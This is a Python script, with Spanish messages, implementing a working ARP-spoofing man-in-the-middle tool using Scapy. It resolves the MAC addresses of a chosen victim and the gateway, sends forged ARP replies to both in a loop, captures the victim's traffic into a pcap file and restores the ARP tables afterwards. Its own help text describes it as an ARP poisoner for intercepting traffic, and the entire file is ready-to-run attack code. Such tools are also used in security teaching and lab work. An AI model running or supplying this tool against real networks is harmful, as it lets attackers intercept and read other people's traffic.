import argparse
import os
import sys
import time
from multiprocessing import Process

from scapy.all import ARP, Ether, conf, send, sndrcv, wrpcap
from scapy.all import sniff as scapy_sniff

conf.verb = 0


def get_mac(targetip, interface):
    packet = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(op="who-has", pdst=targetip)
    resp, _ = sndrcv(packet, timeout=2, retry=10, verbose=False, iface=interface)
    for _, r in resp:
        return r[Ether].src
    return None


class Arper:
    def __init__(self, victim, gateway, interface="eth0", count=200, outfile="arper.pcap"):
        self.victim = victim
        self.gateway = gateway
        self.interface = interface
        self.count = count
        self.outfile = outfile
        conf.iface = interface

        self.victimmac = get_mac(victim, interface)
        if self.victimmac is None:
            raise RuntimeError(f"No se pudo resolver la MAC de la victima {victim}")

        self.gatewaymac = get_mac(gateway, interface)
        if self.gatewaymac is None:
            raise RuntimeError(f"No se pudo resolver la MAC de la puerta de enlace {gateway}")

        self.poison_thread = None
        self.sniff_thread = None

        print(f"Initialized {interface}:")
        print(f"Gateway ({gateway}) is at {self.gatewaymac}.")
        print(f"Victim ({victim}) is at {self.victimmac}.")
        print("-" * 30)

    def run(self):
        self.poison_thread = Process(target=self.poison)
        self.poison_thread.start()

        self.sniff_thread = Process(target=self.sniff)
        self.sniff_thread.start()

    def poison(self):
        poison_victim = ARP(op=2, psrc=self.gateway, pdst=self.victim, hwdst=self.victimmac)
        poison_gateway = ARP(op=2, psrc=self.victim, pdst=self.gateway, hwdst=self.gatewaymac)
        try:
            while True:
                send(poison_victim)
                send(poison_gateway)
                time.sleep(2)
        except KeyboardInterrupt:
            self.restore()
            sys.exit(0)

    def sniff(self):
        time.sleep(5)
        print("[*] Iniciando el envenenamiento ARP. [CTRL-C para detener]")
        bpf_filter = f"ip host {self.victim}"
        packets = scapy_sniff(count=self.count, filter=bpf_filter, iface=self.interface)
        wrpcap(self.outfile, packets)
        print(f"[*] Capturados {len(packets)} paquetes, guardados en {self.outfile}.")
        print("[*] Restaurando las tablas ARP...")
        self.restore()
        print("[*] Terminado.")

    def restore(self):
        send(
            ARP(op=2, psrc=self.gateway, pdst=self.victim, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=self.gatewaymac),
            count=5,
        )
        send(
            ARP(op=2, psrc=self.victim, pdst=self.gateway, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=self.victimmac),
            count=5,
        )


def parse_args():
    parser = argparse.ArgumentParser(
        description=(
            "Envenenador ARP para ataques MITM: engana a una victima y a la puerta de enlace "
            "para interceptar el trafico entre ambas, lo captura en un pcap y restaura las "
            "tablas ARP al terminar."
        )
    )
    parser.add_argument("victim", help="IP de la maquina victima")
    parser.add_argument("gateway", help="IP de la puerta de enlace")
    parser.add_argument("interface", nargs="?", default="eth0", help="Interfaz de red a usar")
    parser.add_argument(
        "-c", "--count", type=int, default=200, help="Numero de paquetes a capturar antes de restaurar"
    )
    parser.add_argument("-o", "--outfile", default="arper.pcap", help="Archivo pcap donde guardar la captura")
    return parser.parse_args()


def main():
    args = parse_args()
    if os.name != "nt" and os.geteuid() != 0:
        print("[!] Este script necesita privilegios de root para enviar paquetes ARP.", file=sys.stderr)
        sys.exit(1)

    try:
        arper = Arper(args.victim, args.gateway, args.interface, count=args.count, outfile=args.outfile)
    except RuntimeError as e:
        print(f"[!] {e}", file=sys.stderr)
        sys.exit(1)

    arper.run()
    try:
        arper.sniff_thread.join()
    except KeyboardInterrupt:
        pass
    finally:
        if arper.poison_thread.is_alive():
            arper.poison_thread.terminate()
        arper.poison_thread.join()


if __name__ == "__main__":
    main()
